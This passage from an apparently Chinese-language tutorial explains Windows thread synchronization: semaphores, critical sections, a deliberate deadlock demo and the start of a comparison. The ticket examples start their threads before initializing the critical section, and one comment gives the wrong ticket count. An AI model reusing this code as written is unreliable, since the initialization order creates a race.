style="background:#5de420">工作原理：</span></p><ul><li><p>以一个停车场是运作为例。假设停车场只有三个车位，一开始三个车位都是空的。</p></li><li><p>这时如果同时来了五辆车，看门人允许其中三辆不受阻碍的进入，然后放下车拦，剩下的车则必须在入口等待，此后来的车也都不得不在入口处等待。</p></li><li><p>这时，有一辆车离开停车场，看门人得知后，打开车拦，放入一辆；如果又离开两辆，则又可以放入两辆，如此往复。</p></li><li><p>这个停车系统中，每辆车就好比一个线程，看门人就好比一个信号量，看门人限制了可以活动的线程。假如里面依然是三个车位，但是看门人改变了规则，要求每次只能停两辆车，那么一开始进入两辆车，后面得等到有车离开才能有车进入，但是得保证最多停两辆车。</p></li><li><p>对于<code>Semaphore</code>而言，就如同一个看门人，限制了可活动的线程数。</p></li></ul><p><span style="background:#5de420">信号量的组成</span></p><ul><li><p>① 计数器：该内核对象被使用的次数</p></li><li><p>② <strong>最大资源数量</strong>：标识信号量可以控制的最大资源数量（带符号的32位）</p></li><li><p>③ <strong>当前资源数量</strong>：标识当前可用资源的数量（带符号的32位）</p><ul><li>即表示<strong>当前开放资源的个数</strong>（注意<strong>不是剩下资源的个数</strong>），<strong>只有开放的资源才能被线程所申请</strong>。</li><li>但这些开放的资源不一定被线程占用完。比如，当前开放5个资源，而只有3个线程申请，则还有2个资源可被申请，但如果这时总共是7个线程要使用信号量，显然开放的资源5个是不够的。这时还可以再开放2个，直到达到最大资源数量。</li></ul></li></ul><p><span style="background:#5de420">信号量的规则如下：</span></p><ol><li><p>如果当前资源计数大于0，那么信号量处于触发状态(有信号状态)，表示有可用资源。</p></li><li><p>如果当前资源计数等于0，那么信号量属于未触发状态（无信号状态），表示没有可用资源。</p></li><li><p>系统绝对不会让当前资源计数变为负数</p></li><li><p>当前资源计数绝对不会大于最大资源计数</p><p><img src="./7-3.png" alt="img"></p></li></ol><p><span style="background:#5de420">信号量与互斥量的区别：</span></p><ul><li>信号量允许多个线程在同一时刻访问同一资源，但是需要限制在同一时刻访问此资源的最大线程数目。</li><li>信号量对象对线程的同步方式与前面几种方法不同，<strong>信号允许多个线程同时使用共享资源</strong>。</li></ul><br><p><strong>信号量API</strong></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//创建信号量</span></span><br><span class="line"><span class="function">HANDLE WINAPI <span class="title">CreateSemaphoreW</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    _In_opt_ LPSECURITY_ATTRIBUTES lpSemaphoreAttributes,  <span class="comment">// Null 安全属性</span></span></span></span><br><span class="line"><span class="params"><span class="function">    _In_ LONG lInitialCount,  <span class="comment">//初始化时，共有多少个资源是可以用的。 0：未触发状态（无信号状态），表示没有可用资源</span></span></span></span><br><span class="line"><span class="params"><span class="function">    _In_ LONG lMaximumCount,  <span class="comment">//能够处理的最大的资源数量   3</span></span></span></span><br><span class="line"><span class="params"><span class="function">    _In_opt_ LPCWSTR lpName   <span class="comment">//NULL 信号量的名称</span></span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//增加信号量</span></span><br><span class="line"><span class="function">WINAPI <span class="title">ReleaseSemaphore</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    _In_ HANDLE hSemaphore,   <span class="comment">//信号量的句柄</span></span></span></span><br><span class="line"><span class="params"><span class="function">    _In_ LONG lReleaseCount,   <span class="comment">//将lReleaseCount值加到信号量的当前资源计数上面 0-&gt; 1</span></span></span></span><br><span class="line"><span class="params"><span class="function">    _Out_opt_ LPLONG lpPreviousCount  <span class="comment">//当前资源计数的原始值</span></span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//关闭句柄</span></span><br><span class="line"><span class="built_in">CloseHandle</span>(</span><br><span class="line">    _In_ _Post_ptr_invalid_ HANDLE hObject</span><br><span class="line">);</span><br></pre></td></tr></table></figure><p><strong>示例：</strong>实现先后循环输入数字，并求和</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;process.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> <span class="keyword">warning</span>(disable:4996)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 实现先循环输入数字，并求和</span></span><br><span class="line"><span class="function"><span class="type">unsigned</span> WINAPI <span class="title">Read</span><span class="params">(<span class="type">void</span>* arg)</span></span>;</span><br><span class="line"><span class="function"><span class="type">unsigned</span> WINAPI <span class="title">Accu</span><span class="params">(<span class="type">void</span>* arg)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> HANDLE semOne;</span><br><span class="line"><span class="type">static</span> HANDLE semTwo;</span><br><span class="line"><span class="type">static</span> <span class="type">int</span> num;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    HANDLE hThread1, hThread2;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//semOne 没有可用资源，只能表示0或者1的二进制信号量  无信号</span></span><br><span class="line">    <span class="comment">//semTwo 有可用资源，有信号状态   有信号</span></span><br><span class="line">    semOne = <span class="built_in">CreateSemaphore</span>(<span class="literal">NULL</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="literal">NULL</span>);</span><br><span class="line">    semTwo = <span class="built_in">CreateSemaphore</span>(<span class="literal">NULL</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="literal">NULL</span>);</span><br><span class="line">    </span><br><span class="line">    hThread1 = (HANDLE)_beginthreadex(<span class="literal">NULL</span>, <span class="number">0</span>, Read, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">    hThread2 = (HANDLE)_beginthreadex(<span class="literal">NULL</span>, <span class="number">0</span>, Accu, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">WaitForSingleObject</span>(hThread1, INFINITE);</span><br><span class="line">    <span class="built_in">WaitForSingleObject</span>(hThread2, INFINITE);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">CloseHandle</span>(semOne);</span><br><span class="line">    <span class="built_in">CloseHandle</span>(semTwo);</span><br><span class="line">    <span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">unsigned</span> WINAPI <span class="title">Read</span><span class="params">(<span class="type">void</span>* arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">5</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">fputs</span>(<span class="string">&quot;Input num: &quot;</span>, stdout);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;begin read\n&quot;</span>);</span><br><span class="line">        <span class="comment">//等待内核对象semTwo的信号，如果有信号，继续执行；如果没有信号，等待</span></span><br><span class="line">        <span class="built_in">WaitForSingleObject</span>(semTwo, INFINITE);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;beginning read\n&quot;</span>);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;num);</span><br><span class="line">        <span class="built_in">ReleaseSemaphore</span>(semOne, <span class="number">1</span>, <span class="literal">NULL</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">unsigned</span> WINAPI <span class="title">Accu</span><span class="params">(<span class="type">void</span>* arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> sum = <span class="number">0</span>, i;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">5</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;begin Accu\n&quot;</span>);</span><br><span class="line">        <span class="comment">//等待内核对象semOne的信号，如果有信号，继续执行；如果没有信号，等待</span></span><br><span class="line">        <span class="built_in">WaitForSingleObject</span>(semOne, INFINITE);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;beginning Accu\n&quot;</span>);</span><br><span class="line">        sum += num;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;sum = %d \n&quot;</span>, sum);</span><br><span class="line">        <span class="built_in">ReleaseSemaphore</span>(semTwo, <span class="number">1</span>, <span class="literal">NULL</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Result: %d \n&quot;</span>, sum);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><br><h3 id="7-4-线程同步之关键代码段"><a href="#7-4-线程同步之关键代码段" class="headerlink" title="7.4 线程同步之关键代码段"></a>7.4 线程同步之关键代码段</h3><p>关键代码段，也称为临界区，工作在<strong>用户方式</strong>下【用户态】。</p><ul><li>它是指一个小代码段，在代码能够执行前，它必须独占对某些资源的访问权。</li><li>通常把多线程中访问同一种资源的那部分代码当做关键代码段。</li></ul><p><strong>使用步骤：</strong></p><ol><li><p>初始化关键代码段：调用<code>InitializeCriticalSection</code>函数初始化一个关键代码段。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">InitializeCriticalSection</span>(</span><br><span class="line">    _Out_ LPCRITICAL_SECTION lpCriticalSection</span><br><span class="line">);</span><br><span class="line"><span class="comment">//该函数只有一个指向CRITICAL_SECTION结构体的指针。</span></span><br><span class="line"><span class="comment">//在调用InitializeCriticalSection函数之前，首先需要构造一个CRITICAL_SECTION结构体类型的对象</span></span><br><span class="line"><span class="comment">//然后将该对象的地址传递给InitializeCriticalSection函数。</span></span><br></pre></td></tr></table></figure></li><li><p>进入关键代码段：调用<code>EnterCriticalSection</code>函数，以获得指定的临界区对象的所有权。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">VOID WINAPI <span class="title">EnterCriticalSection</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    _Inout_ LPCRITICAL_SECTION lpCriticalSection</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br><span class="line"><span class="comment">//该函数等待指定的临界区对象的所有权，如果该所有权赋予了调用线程，则该函数就返回；</span></span><br><span class="line"><span class="comment">//否则该函数会一直等待，从而导致线程等待。</span></span><br></pre></td></tr></table></figure></li><li><p>退出关键代码段： 线程使用完临界区所保护的资源之后，需要调用<code>LeaveCriticalSection</code>函数，释放指定的临界区对象的所有权。之后，其他想要获得该临界区对象所有权的线程就可以获得该所有权，从而进入关键代码段，访问保护的资源。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">VOID WINAPI <span class="title">LeaveCriticalSection</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    _Inout_ LPCRITICAL_SECTION lpCriticalSection</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></table></figure></li><li><p>删除临界区：当临界区不再需要时，可以调用<code>DeleteCriticalSection</code>函数释放该对象，该函数将释放一个没有被任何线程所拥有的临界区对象的所有资源。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">WINBASEAPI VOID WINAPI <span class="title">DeleteCriticalSection</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    _Inout_ LPCRITICAL_SECTION lpCriticalSection</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></table></figure></li></ol><p><strong>示例：卖票系统</strong></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;process.h&gt;</span> </span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> iTickets = <span class="number">1000</span>;<span class="comment">//共5000张票</span></span><br><span class="line">CRITICAL_SECTION g_cs;</span><br><span class="line"></span><br><span class="line"><span class="comment">// A窗口     B窗口</span></span><br><span class="line"></span><br><span class="line"><span class="function">DWORD WINAPI <span class="title">SellTicketA</span><span class="params">(<span class="type">void</span>* lpParam)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">EnterCriticalSection</span>(&amp;g_cs);<span class="comment">//进入临界区</span></span><br><span class="line">        <span class="keyword">if</span> (iTickets &gt; <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">//Sleep(1);</span></span><br><span class="line">            iTickets--;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;A remain %d\n&quot;</span>, iTickets);</span><br><span class="line">            <span class="built_in">LeaveCriticalSection</span>(&amp;g_cs);<span class="comment">//离开临界区</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">LeaveCriticalSection</span>(&amp;g_cs);<span class="comment">//离开临界区</span></span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">DWORD WINAPI <span class="title">SellTicketB</span><span class="params">(<span class="type">void</span>* lpParam)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">EnterCriticalSection</span>(&amp;g_cs);<span class="comment">//进入临界区</span></span><br><span class="line">        <span class="keyword">if</span> (iTickets &gt; <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">//Sleep(1);</span></span><br><span class="line">            iTickets--;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;B remain %d\n&quot;</span>, iTickets);</span><br><span class="line">            <span class="built_in">LeaveCriticalSection</span>(&amp;g_cs);<span class="comment">//离开临界区</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">LeaveCriticalSection</span>(&amp;g_cs);<span class="comment">//离开临界区</span></span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    HANDLE hThreadA, hThreadB;</span><br><span class="line">    hThreadA = <span class="built_in">CreateThread</span>(<span class="literal">NULL</span>, <span class="number">0</span>, SellTicketA, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="literal">NULL</span>);  <span class="comment">//引用计数:2</span></span><br><span class="line">    hThreadB = <span class="built_in">CreateThread</span>(<span class="literal">NULL</span>, <span class="number">0</span>, SellTicketB, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="literal">NULL</span>);  <span class="comment">//引用计数:2</span></span><br><span class="line">    <span class="built_in">CloseHandle</span>(hThreadA); <span class="comment">//引用计数:1【当线程结束即退出】</span></span><br><span class="line">    <span class="built_in">CloseHandle</span>(hThreadB); <span class="comment">//引用计数:1</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">InitializeCriticalSection</span>(&amp;g_cs); <span class="comment">//初始化关键代码段</span></span><br><span class="line">    <span class="built_in">Sleep</span>(<span class="number">20000</span>);</span><br><span class="line">    <span class="built_in">DeleteCriticalSection</span>(&amp;g_cs);<span class="comment">//删除临界区</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><br><h3 id="7-5-线程死锁"><a href="#7-5-线程死锁" class="headerlink" title="7.5 线程死锁"></a>7.5 线程死锁</h3><p>死锁是指多个线程因竞争资源而造成的一种僵局【互相等待】。若无外力作用，这些进程都将无法向前推进。</p><p><strong>示例：</strong>修改上节的买票系统【SellA先进入临界区A然后等待1s，此时线程切换，SellB率先抢占临界区B。至此，二者相互等待】</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;process.h&gt;</span> </span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> iTickets = <span class="number">5000</span>;</span><br><span class="line">CRITICAL_SECTION g_csA;</span><br><span class="line">CRITICAL_SECTION g_csB;</span><br><span class="line"></span><br><span class="line"><span class="comment">// A窗口     B窗口</span></span><br><span class="line"></span><br><span class="line"><span class="function">DWORD WINAPI <span class="title">SellTicketA</span><span class="params">(<span class="type">void</span>* lpParam)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">EnterCriticalSection</span>(&amp;g_csA);<span class="comment">//进入临界区A</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;A\n&quot;</span>);</span><br><span class="line">        <span class="built_in">Sleep</span>(<span class="number">1</span>);</span><br><span class="line">        <span class="built_in">EnterCriticalSection</span>(&amp;g_csB);<span class="comment">//进入临界区B</span></span><br><span class="line">        <span class="keyword">if</span> (iTickets &gt; <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">Sleep</span>(<span class="number">1</span>);</span><br><span class="line">            iTickets--;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;A remain %d\n&quot;</span>, iTickets);</span><br><span class="line">            <span class="built_in">LeaveCriticalSection</span>(&amp;g_csB);<span class="comment">//离开临界区B</span></span><br><span class="line">            <span class="built_in">LeaveCriticalSection</span>(&amp;g_csA);<span class="comment">//离开临界区A</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">LeaveCriticalSection</span>(&amp;g_csB);<span class="comment">//离开临界区B</span></span><br><span class="line">            <span class="built_in">LeaveCriticalSection</span>(&amp;g_csA);<span class="comment">//离开临界区A</span></span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">DWORD WINAPI <span class="title">SellTicketB</span><span class="params">(<span class="type">void</span>* lpParam)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">EnterCriticalSection</span>(&amp;g_csB);<span class="comment">//进入临界区B</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;B\n&quot;</span>);</span><br><span class="line">        <span class="built_in">Sleep</span>(<span class="number">1</span>);</span><br><span class="line">        <span class="built_in">EnterCriticalSection</span>(&amp;g_csA);<span class="comment">//进入临界区A</span></span><br><span class="line">        <span class="keyword">if</span> (iTickets &gt; <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">Sleep</span>(<span class="number">1</span>);</span><br><span class="line">            iTickets--;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;B remain %d\n&quot;</span>, iTickets);</span><br><span class="line">            <span class="built_in">LeaveCriticalSection</span>(&amp;g_csA);<span class="comment">//离开临界区A</span></span><br><span class="line">            <span class="built_in">LeaveCriticalSection</span>(&amp;g_csB);<span class="comment">//离开临界区B</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">LeaveCriticalSection</span>(&amp;g_csA);<span class="comment">//离开临界区A</span></span><br><span class="line">            <span class="built_in">LeaveCriticalSection</span>(&amp;g_csB);<span class="comment">//离开临界区B</span></span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    HANDLE hThreadA, hThreadB;</span><br><span class="line">    hThreadA = <span class="built_in">CreateThread</span>(<span class="literal">NULL</span>, <span class="number">0</span>, SellTicketA, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="literal">NULL</span>);  <span class="comment">//2</span></span><br><span class="line">    hThreadB = <span class="built_in">CreateThread</span>(<span class="literal">NULL</span>, <span class="number">0</span>, SellTicketB, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="literal">NULL</span>);  <span class="comment">//2</span></span><br><span class="line">    <span class="built_in">CloseHandle</span>(hThreadA); <span class="comment">//1</span></span><br><span class="line">    <span class="built_in">CloseHandle</span>(hThreadB); <span class="comment">//1</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">InitializeCriticalSection</span>(&amp;g_csA); <span class="comment">//初始化关键代码段A</span></span><br><span class="line">    <span class="built_in">InitializeCriticalSection</span>(&amp;g_csB); <span class="comment">//初始化关键代码段B</span></span><br><span class="line">    <span class="built_in">Sleep</span>(<span class="number">5000</span>);</span><br><span class="line">    <span class="built_in">DeleteCriticalSection</span>(&amp;g_csA);<span class="comment">//删除临界区</span></span><br><span class="line">    <span class="built_in">DeleteCriticalSection</span>(&amp;g_csB);<span class="comment">//删除临界区</span></span><br><span class="line">    </span><br><span class="line">    <span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>解决：避免死锁</p></blockquote><br><h3 id="7-6-各种线程同步的比较总结"><a href="#7-6-各种线程同步的比较总结" class="headerlink" title="7.6 各种线程同步的比较总结"></a>7.6 各种线程同步的比较总结</h3><p><code>windows</code>线程同步的方式主要有四种：互斥对象<code>Mutex</code>、信号量<code>Semaphore</code>、事件对象<code>event</code>和关键代码段<code>criticalSection</code>。</p><p>对于上面介绍的四种线程同步的方式，它们之间的区别如下所述：</p><p>​ ● 互斥对象和事件以及信号量都属于内核对象，利用内核对象进行线程同步。因此，速度较慢，但利用互斥对象和事件对象这样的内核对象，可以在<strong>多个进程中的各个线程间</strong>进行同步。</p><p>​ ● 